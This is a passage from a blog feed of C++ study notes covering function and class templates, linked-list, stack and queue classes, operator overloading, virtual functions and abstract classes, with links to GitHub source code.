href="https://github.com/hustlixiang21/cpp-practice/tree/main/%E6%95%B0%E5%80%BC%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B">https://github.com/hustlixiang21/cpp-practice/tree/main/%E6%95%B0%E5%80%BC%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B</a></p><h1 id="Comprehensive-Example-Bank-Account-Management"><a href="#Comprehensive-Example-Bank-Account-Management" class="headerlink" title="Comprehensive Example - Bank Account Management"></a>Comprehensive Example - Bank Account Management</h1><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update4">Source Code + Updates</a></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Templates and Data Organization</title>
      <link href="/2022/08/04/Templates%20and%20Data%20Organization/"/>
      <url>/2022/08/04/Templates%20and%20Data%20Organization/</url>
      
        <content type="html"><![CDATA[<h1 id="Function-Templates-and-Class-Templates"><a href="#Function-Templates-and-Class-Templates" class="headerlink" title="Function Templates and Class Templates"></a>Function Templates and Class Templates</h1><p>Templates can implement <strong>parametric polymorphism</strong>, which parameterizes the types of objects that programs process, enabling a single program to handle multiple <strong>different types</strong> of objects.</p><h2 id="Function-Templates"><a href="#Function-Templates" class="headerlink" title="Function Templates"></a>Function Templates</h2><p>The purpose of function templates is simply to avoid repetitive writing of functions that only differ in the <strong>data types</strong> they handle, greatly improving code reusability and thus enhancing software development efficiency.</p><p>The syntax form adds the statement <code>template&lt;template parameter list&gt;</code> before the function definition</p><p>Contents of the template parameter list:</p><ul><li>Type parameters: class (or typename) identifier</li><li>Constant parameters: type specifier identifier</li><li>Template parameters: template<parameter list> class identifier</li></ul><p>Example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Universal absolute value function</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">abs</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x&gt;<span class="number">0</span> ? x : -x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <div class="note danger flat"><p>Function templates are fundamentally different from functions</p><ol><li>Function templates themselves <strong>do not generate</strong> any object code at compile time; only instances of function templates generate object code.</li><li>Function templates referenced by multiple source files need to be placed in header files along with the function body, not just the declaration like ordinary functions.</li><li>Function pointers can only point to instances of function templates, <strong>not to function templates</strong>.</li></ol></div><h2 id="Class-Templates"><a href="#Class-Templates" class="headerlink" title="Class Templates"></a>Class Templates</h2><p>Using class templates allows you to define a pattern for a class, enabling certain data members, parameters of certain member functions, return values, or local variables in the class to take any type.</p><p>The declaration method of class templates is the same as function templates,</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Define member functions outside the class template</span></span><br><span class="line"><span class="keyword">template</span>&lt;模板参数表&gt;</span><br><span class="line">类型名 类名&lt;模板参数标识符列表&gt;::函数名(参数表)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Use template class to define objects</span></span><br><span class="line">模板名&lt;模版参数类型&gt;对象名<span class="number">1</span>,...,对象名n;</span><br></pre></td></tr></table></figure><h1 id="Linear-Groups"><a href="#Linear-Groups" class="headerlink" title="Linear Groups"></a>Linear Groups</h1><p>Linear groups, as the name suggests, have elements whose positions correspond to their positional relationships. They can be classified into direct access, sequential access, and indexed access. Direct access means jumping directly to the position that needs to be accessed without following order, while sequential access can only access from the beginning according to the element arrangement order.</p><h2 id="Direct-Access-Groups-Array-Class"><a href="#Direct-Access-Groups-Array-Class" class="headerlink" title="Direct Access Groups - Array Class"></a>Direct Access Groups - Array Class</h2><p>Required to design a variable-length array, <a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%95%B0%E7%BB%84%E7%B1%BB%E6%A8%A1%E7%89%88/Array.h">click to view source code</a>, and list some syntax points to note.</p> <div class="note info flat"><p>Syntax rules state that “&#x3D;”, “[ ]”, “( )”, “-&gt;” can only be overloaded as member functions, and the “&#x3D;” operator function in derived classes will always hide the “&#x3D;” operator in the base class.</p></div><p>If we want to use Array class objects like ordinary arrays in programs, we need to overload the pointer conversion operator.</p><h3 id="Role-of-Pointer-Conversion-Operator"><a href="#Role-of-Pointer-Conversion-Operator" class="headerlink" title="Role of Pointer Conversion Operator"></a>Role of Pointer Conversion Operator</h3><p>To explain the necessity of overloading the pointer conversion operator, let’s first look at the following program:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span> <span class="params">(<span class="type">int</span> *p, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++）</span><br><span class="line">        cin&gt;&gt;p[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">read</span>(a,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here, the first parameter of the read function is an int pointer, and the array name a is an int address constant, so the types match exactly. If we want to use Array class objects like ordinary arrays in programs, modify the main function as follows:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function">Arrays&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="built_in">read</span>(a,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>What will happen? This time when calling read, it will be found that the actual parameter type is different from the formal parameter type. At this point, the compilation system will attempt automatic type conversion: converting the object name to int * type. Since a is a custom type object, the automatic conversion function provided by the compilation system <strong>cannot implement this conversion</strong>, so we need to write our own overloaded pointer type conversion function.<br>In C++, if you want to implicitly or explicitly convert an object of custom type T to type S, you can define operator S as a member function of T. This way, when converting a T type object implicitly to S type, or using static_cast to explicitly convert to S type, this member function will be called. The overloaded function of the conversion operator does not need to specify the return value type, because in this case <strong>the return type of the overloaded function is consistent with the operator name</strong>, so the C++ standard stipulates that return value types cannot be specified for such functions (and void should not be written).<br>When the object itself is a constant, to avoid modifying array content through pointers, the object can only be converted to a constant pointer.</p><p>The way to overload the pointer conversion operator in this Array class is as follows:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt;::<span class="keyword">operator</span> T *()  <span class="comment">//不用写返回值的类型</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> list;<span class="comment">//First address of the array</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Sequential-Access-Groups-Linked-List-Class"><a href="#Sequential-Access-Groups-Linked-List-Class" class="headerlink" title="Sequential Access Groups - Linked List Class"></a>Sequential Access Groups - Linked List Class</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LinkedList.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LINKEDLIST_H </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LINKEDLIST_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Node.h&quot;</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;T&gt; *front, *rear;      <span class="comment">//Head and tail pointers</span></span><br><span class="line">    Node&lt;T&gt; *prevPtr, *currPtr; <span class="comment">//Pointers recording current traversal position in the list, updated by insert and delete operations</span></span><br><span class="line">    <span class="type">int</span> size;                   <span class="comment">//Number of elements in the list</span></span><br><span class="line">    <span class="type">int</span> position;               <span class="comment">//Position index of current element in the list. Used by reset function</span></span><br><span class="line">    <span class="comment">//Generate new node with data field item and pointer field ptrNext</span></span><br><span class="line">    <span class="function">Node&lt;T&gt; *<span class="title">newNode</span><span class="params">(<span class="type">const</span> T &amp;item, Node&lt;T&gt; *ptrNext = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">freeNode</span><span class="params">(Node&lt;T&gt; *p)</span></span>; <span class="comment">//Free node</span></span><br><span class="line">    <span class="comment">//Copy linked list L to current list (assuming current list is empty), called by copy constructor and operator =</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">copy</span><span class="params">(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedList</span>();                                     <span class="comment">//Constructor</span></span><br><span class="line">    <span class="built_in">LinkedList</span>(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L);               <span class="comment">//Copy constructor</span></span><br><span class="line">    ~<span class="built_in">LinkedList</span>();                                    <span class="comment">//Destructor</span></span><br><span class="line">    LinkedList&lt;T&gt; &amp;<span class="keyword">operator</span>=(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L); <span class="comment">//Overloaded assignment operator</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span> <span class="type">const</span></span>;                              <span class="comment">//Return number of elements in linked list bool isEmpty() const; //Whether linked list is empty</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reset</span><span class="params">(<span class="type">int</span> pos = <span class="number">0</span>)</span></span>;                          <span class="comment">//Initialize cursor position</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">next</span><span class="params">()</span></span>;                                      <span class="comment">//Move cursor to next node</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">endOfList</span><span class="params">()</span> <span class="type">const</span></span>;                           <span class="comment">//Whether cursor has reached end of list</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">currentPosition</span><span class="params">()</span> <span class="type">const</span></span>;                      <span class="comment">//Return current cursor position</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertFront</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                  <span class="comment">//Insert node at head</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertRear</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                   <span class="comment">//Add node at tail</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertAt</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                     <span class="comment">//Insert node before current node</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertAfter</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                  <span class="comment">//Insert node after current node</span></span><br><span class="line">    <span class="function">T <span class="title">deleteFront</span><span class="params">()</span></span>;                                  <span class="comment">//Delete head node</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteCurrent</span><span class="params">()</span></span>;                             <span class="comment">//Delete current node</span></span><br><span class="line">    <span class="function">T &amp;<span class="title">data</span><span class="params">()</span></span>;                                        <span class="comment">//Return reference to current node member data</span></span><br><span class="line">    <span class="function"><span class="type">const</span> T &amp;<span class="title">data</span><span class="params">()</span> <span class="type">const</span></span>;                            <span class="comment">//Return const reference to current node member data</span></span><br><span class="line">    <span class="comment">//Clear linked list: free memory space of all nodes. Called by destructor and operator=</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// LINKEDLIST_H </span></span></span><br><span class="line"><span class="comment">//Linked list class template function implementation code can be downloaded from the internet</span></span><br></pre></td></tr></table></figure><p>Basic operations of linked lists:</p><ul><li>Generate linked list</li><li>Insert nodes</li><li>Search nodes</li><li>Delete nodes</li><li>Traverse linked list</li><li>Clear linked list</li></ul><h2 id="Stack-Class"><a href="#Stack-Class" class="headerlink" title="Stack Class"></a>Stack Class</h2><p><strong>Stack class template implementation</strong>, <a href="https://github.com/hustlixiang21/cpp-practice/blob/main/stack_calculator/Stack.h">click to view source code</a>.</p><p>Stack elements can actually be represented using <strong>arrays</strong> or <strong>linked lists</strong>.</p><p>Basic operations of stacks:</p><ul><li>Initialize</li><li>Push</li><li>Pop</li><li>Clear stack</li><li>Access top element</li><li>Check stack status (full, empty)</li></ul><h2 id="Queue-Class"><a href="#Queue-Class" class="headerlink" title="Queue Class"></a>Queue Class</h2><p>Designed as a circular queue using arrays, which is quite troublesome for additions and deletions. Actually, I think using linked lists wouldn’t require circular implementation.</p><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E9%98%9F%E5%88%97%E7%B1%BB%E6%A8%A1%E7%89%88/Queue.h">Click here to view source code</a></p><h1 id="Organization-of-Group-Arrays"><a href="#Organization-of-Group-Arrays" class="headerlink" title="Organization of Group Arrays"></a>Organization of Group Arrays</h1><p>Simple sorting and searching are quite basic, so some images and links are inserted here for better understanding.</p><p><img src="https://pic3.zhimg.com/80/v2-7da3a687b4b607d415bbf4617768727f_1440w.jpeg"></p><p><a href="https://labuladong.github.io/algo/1/11/">I wrote a poem about binary search - labuladong</a></p><h1 id="Comprehensive-Example-Improvement-of-Personal-Bank-Account-Management-Program"><a href="#Comprehensive-Example-Improvement-of-Personal-Bank-Account-Management-Program" class="headerlink" title="Comprehensive Example - Improvement of Personal Bank Account Management Program"></a>Comprehensive Example - Improvement of Personal Bank Account Management Program</h1><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_3">View source code click here</a></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polymorphism</title>
      <link href="/2022/07/31/Polymorphism/"/>
      <url>/2022/07/31/Polymorphism/</url>
      
        <content type="html"><![CDATA[<h1 id="Polymorphism-Overview"><a href="#Polymorphism-Overview" class="headerlink" title="Polymorphism Overview"></a>Polymorphism Overview</h1><p>Polymorphism refers to different behaviors when the same message is received by different types of objects. A message refers to <strong>calls to class member functions</strong>, and different behaviors refer to different implementations, which is <strong>calling different functions</strong>.</p><p>The simplest example is the <strong>“+”</strong> operator, which can implement addition between integers, floating-point numbers, and double-precision floating-point numbers, including mixed-type addition. The same “+” message, when received by different types of objects, uses different methods for addition operations. This is polymorphism.</p><h2 id="Types-of-Polymorphism"><a href="#Types-of-Polymorphism" class="headerlink" title="Types of Polymorphism"></a>Types of Polymorphism</h2><p>Object-oriented polymorphism can be divided into four categories:</p><ul><li>Overloading Polymorphism</li><li>Coercion Polymorphism</li><li>Inclusion Polymorphism</li><li>Parametric Polymorphism</li></ul><p>The first two are called <strong>ad-hoc polymorphism</strong>, and the latter two are called <strong>universal polymorphism</strong>.</p><ol><li>Overloading polymorphism refers to the overloading of ordinary functions and class member functions learned before, and of course includes <strong>operator overloading</strong>.</li><li>Coercion polymorphism, simply put, is when <strong>+</strong> involves mixed types, it will perform type coercion, which is an instance of coercion polymorphism.</li><li>Inclusion polymorphism mainly refers to the polymorphic behavior of member functions with the same name defined in different classes in a class hierarchy, implemented through <strong>virtual functions</strong>.</li><li>Parametric polymorphism is associated with class templates and must be given actual types when used to be instantiated.</li></ol><p>This article will introduce operator overloading and virtual functions.</p><h2 id="Implementation-of-Polymorphism"><a href="#Implementation-of-Polymorphism" class="headerlink" title="Implementation of Polymorphism"></a>Implementation of Polymorphism</h2><p>Polymorphism can be divided into two categories from an implementation perspective: <strong>compile-time polymorphism and runtime polymorphism</strong>. The former, as the name suggests, determines the specific operation object of the same-named operation during compilation. This process of determining the specific object of an operation is called <strong>binding</strong>.</p><p>Binding refers to the process of associating computer programs with each other, the process of <strong>connecting an identifier with a storage address</strong>. In object-oriented terms, it is the process of combining a message with an object’s method.</p><p>Binding is also divided into two types: <strong>static binding</strong> and <strong>dynamic binding</strong>.</p><p>When binding is completed during the compilation and linking phase, it is called <strong>static binding</strong>. Also known as early binding.</p><p>With static binding, <strong>dynamic binding</strong>, as the name suggests, is binding completed during program execution. Also known as late binding. It corresponds to runtime polymorphism.</p><h1 id="Operator-Overloading"><a href="#Operator-Overloading" class="headerlink" title="Operator Overloading"></a>Operator Overloading</h1><p>Operator overloading is giving multiple meanings to existing operators, where the same operator causes different behaviors when acting on different types of data.</p><h2 id="Rules-for-Operator-Overloading"><a href="#Rules-for-Operator-Overloading" class="headerlink" title="Rules for Operator Overloading"></a>Rules for Operator Overloading</h2><ol><li>In C++, except for a few operators, all operators can be overloaded, and <strong>only existing operators can be overloaded</strong>.</li><li>After overloading, the precedence and associativity of operators will not change.</li><li>Operators are appropriately modified for the actual needs of new type data. The overloaded functionality should be similar to the original functionality, cannot change the number of operands, and at least one must be a custom type (otherwise it’s not called overloading).</li></ol><div class="note danger flat"><p>Several operators that cannot be overloaded: class membership operator <strong>“.”</strong>, member function pointer operator “.*”, scope resolution operator “::”, and ternary operator “?:”</p></div><hr><p>There are two forms of overloading: <strong>overloading as non-static member functions of a class</strong> and <strong>overloading as non-member functions</strong>.</p><p>General form for overloading as non-static member functions and non-member functions of a class:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">返回类型 <span class="keyword">operator</span> 运算符(形参表)</span><br><span class="line">&#123;</span><br><span class="line">  函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>When overloading as a non-member function, sometimes you need to access members in the class, in which case it can be declared as a friend function.</p></div><p><strong>Note</strong>:</p><p>When an operator is overloaded as a member function of a class, the number of function parameters is one less than the original number of operands (except for postfix “++” and “–”); when overloaded as a non-member function, the number of parameters equals the number of original operands. The reason is that when overloaded as a member function of a class, the first operand becomes the target object of the function call, so it doesn’t need to appear in the parameter list, and the function body can directly access the members of the first operand. When overloaded as a non-member function, all operands of the operator must be explicitly passed through parameters.</p><h2 id="Operator-Overloading-as-Member-Functions"><a href="#Operator-Overloading-as-Member-Functions" class="headerlink" title="Operator Overloading as Member Functions"></a>Operator Overloading as Member Functions</h2><p>Mainly the difference between unary and binary operators.</p><p>For binary operators, the data type of the preceding class should be a member function of that class, and the data type of the following class should be placed in the formal parameters.</p><p>Unary operators are divided into two types: <strong>prefix unary operators</strong> and <strong>postfix unary operators</strong>. (++, – are unary operators, different names depending on placement)</p><ul><li><p>For prefix unary operators, the overloaded member function has no formal parameters;</p></li><li><p>For postfix unary operators, the function must have an int formal parameter. This int parameter serves no purpose in the operation, it’s only used to distinguish between prefix and postfix.</p></li></ul><h2 id="Operator-Overloading-as-Non-Member-Functions"><a href="#Operator-Overloading-as-Non-Member-Functions" class="headerlink" title="Operator Overloading as Non-Member Functions"></a>Operator Overloading as Non-Member Functions</h2><p>For binary operators, of the two data types before and after, only one needs to be a custom data type to enable operator overloading, and both data types need to be function formal parameters.</p><p>For prefix unary operators, the formal parameter is the data type being operated on.</p><p>For postfix unary operators, there are two formal parameters: one is the data type being operated on, and the other is an int data type.</p><div class="note success flat"><p>It’s not hard to see that the main difference between member functions and non-member functions is that member functions implicitly treat the previous operand as the object of the function call, while non-member functions do not.</p></div><hr><p>This section uses a Complex (complex number class) to illustrate</p><p><a href="https://raw.githubusercontent.com/hustlixiang21/cpp-practice/main/%E5%AE%9D%E8%B4%9D%E6%96%87%E4%BB%B6/3.4.bmp">Click to view problem image</a> (CUG experiment problem)</p><p> <a href="https://github.com/hustlixiang21/cpp-practice/blob/main/Complex/main.cpp">Source code on github</a></p><h1 id="Virtual-Functions"><a href="#Virtual-Functions" class="headerlink" title="Virtual Functions"></a>Virtual Functions</h1><p>Virtual functions are the foundation of dynamic binding. Virtual functions must be non-static member functions. After virtual functions are derived, polymorphism during runtime can be implemented in the class hierarchy.</p><h2 id="General-Virtual-Function-Members"><a href="#General-Virtual-Function-Members" class="headerlink" title="General Virtual Function Members"></a>General Virtual Function Members</h2><p>Declaration syntax</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">virtual</span> 函数类型 函数名(形参表)；</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>Virtual function declarations can only appear in function prototype declarations in class definitions, not in member function implementations.</p></div><p>Conditions required for polymorphism during runtime:</p><pre><code>1. Assignment compatibility rules1. Declare virtual functions1. Call through member functions or access virtual functions through pointers or references</code></pre><p>If the derived class does not explicitly declare virtual functions, the system will follow these rules to determine whether a function member in the derived class is a virtual function:</p><ol><li>Whether the function has the same name as the base class virtual function.</li><li>Whether the function has the same number of parameters and corresponding parameter types as the base class virtual function.</li><li>Whether the function has the same return type as the base class virtual function or satisfies assignment compatibility rules for pointer and reference type return values.</li></ol><p>If the above conditions are met, the virtual function in the derived class will <strong>override</strong> all functions with the same name in the base class, which is scope hiding. Of course, it can also be distinguished through the scope resolution operator “::”.</p><p>It should be emphasized that dynamic binding only occurs when virtual functions are called through base class pointers or references.</p><div class="note success flat"><p>Actually, it doesn’t matter whether you add the virtual keyword before virtual functions in derived classes, but it’s recommended to add it to make it clearer that they are virtual functions.</p></div><p><strong>Object slicing</strong> refers to using an instance of a derived class to initialize a base class object, which calls the base class copy constructor. That is, only the data members of the derived class that are the same as the base class will be copied, and the rest will be ignored. At this point, this base class object has no relationship with the derived class object, which is very consistent with type compatibility rules.</p><h2 id="Virtual-Destructors"><a href="#Virtual-Destructors" class="headerlink" title="Virtual Destructors"></a>Virtual Destructors</h2><p>Virtual constructors cannot be declared, but virtual destructors can be declared. The syntax is to add a virtual keyword before the normal destructor.</p><p>So when do you need to use virtual destructors?</p><p>When a base class pointer points to a derived class object, if <code>delete(base class pointer)</code> is performed at this time, it will call the base class destructor instead of the derived class destructor, causing memory leaks. (I actually think this situation is almost never encountered, just understand it) The difference from polymorphism of ordinary member functions is not much.</p><h1 id="Pure-Virtual-Functions-and-Abstract-Classes"><a href="#Pure-Virtual-Functions-and-Abstract-Classes" class="headerlink" title="Pure Virtual Functions and Abstract Classes"></a>Pure Virtual Functions and Abstract Classes</h1><h2 id="Pure-Virtual-Functions"><a href="#Pure-Virtual-Functions" class="headerlink" title="Pure Virtual Functions"></a>Pure Virtual Functions</h2><p>Pure virtual functions are virtual functions declared in the base class that have no definition in the base class but require any derived class to define its own implementation. The method to implement pure virtual functions in the base class is to add “&#x3D;0” after the function prototype, for example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span></span><br></pre></td></tr></table></figure><p>My big question is why introduce pure virtual functions?</p><ol><li>To facilitate the use of polymorphism features, we often need to define virtual functions in the base class.</li><li>In many cases, it is unreasonable for the base class itself to generate objects.</li></ol><p>For example, animals as a base class can derive subclasses like tigers and peacocks, but animals themselves generating objects is obviously unreasonable.</p><p>To solve the above problems, the concept of pure virtual functions was introduced. When a function is defined as a pure virtual function, the compiler requires that it must be overridden in derived classes to achieve polymorphism. Classes containing pure virtual functions are called abstract classes and cannot generate objects. This solves the above two problems well. Classes that declare pure virtual functions are abstract classes. Therefore, <strong>users cannot create instances of abstract classes</strong>, only instances of their derived classes (which implement the definitions of pure virtual functions in the base class). The most significant feature of pure virtual functions is: they <strong>must redeclare the function in inherited classes</strong> (without the &#x3D;0 at the end, otherwise the derived class cannot be instantiated), and they <strong>often have no definition in abstract classes</strong>. The purpose of defining pure virtual functions is to <strong>make derived classes only inherit the function interface</strong>. The meaning of pure virtual functions is to allow all class objects (mainly derived class objects) to execute the actions of pure virtual functions, but the class cannot provide a reasonable default implementation for pure virtual functions. So the declaration of pure virtual functions in a class is telling the designer of the subclass, “You must provide an implementation of the pure virtual function, but I don’t know how you will implement it.”</p><h2 id="Abstract-Classes"><a href="#Abstract-Classes" class="headerlink" title="Abstract Classes"></a>Abstract Classes</h2><p>Very simple, classes with pure virtual functions are abstract classes and <strong>cannot be instantiated</strong></p><p>If you want to learn more, <a href="https://blog.csdn.net/LY_ysys629/article/details/76904129">see the blog</a>.</p><h1 id="Program-Example-Variable-Step-Size-Trapezoidal-Integration-Algorithm-for-Solving-Function-Definite-Integrals"><a href="#Program-Example-Variable-Step-Size-Trapezoidal-Integration-Algorithm-for-Solving-Function-Definite-Integrals" class="headerlink" title="Program Example - Variable Step Size Trapezoidal Integration Algorithm for Solving Function Definite Integrals"></a>Program Example - Variable Step Size Trapezoidal Integration Algorithm for Solving Function Definite Integrals</h1><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/%E5%8F%98%E6%AD%A5%E9%95%BF%E6%A2%AF%E5%BD%A2%E7%A7%AF%E5%88%86%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9A%E7%A7%AF%E5%88%86.cpp">See github</a></p><h1 id="Comprehensive-Example-Improvement-of-Personal-Bank-Account-Management-Program"><a href="#Comprehensive-Example-Improvement-of-Personal-Bank-Account-Management-Program" class="headerlink" title="Comprehensive Example - Improvement of Personal Bank Account Management Program"></a>Comprehensive Example - Improvement of Personal Bank Account Management Program</h1><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_2">See github</a></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPP Inheritance and Derivation</title>
      <link href="/2022/07/31/CPP%20Inheritance%20and%20Derivation/"/>
      <url>/2022/07/31/CPP%20Inheritance%20and%20Derivation/</url>
      
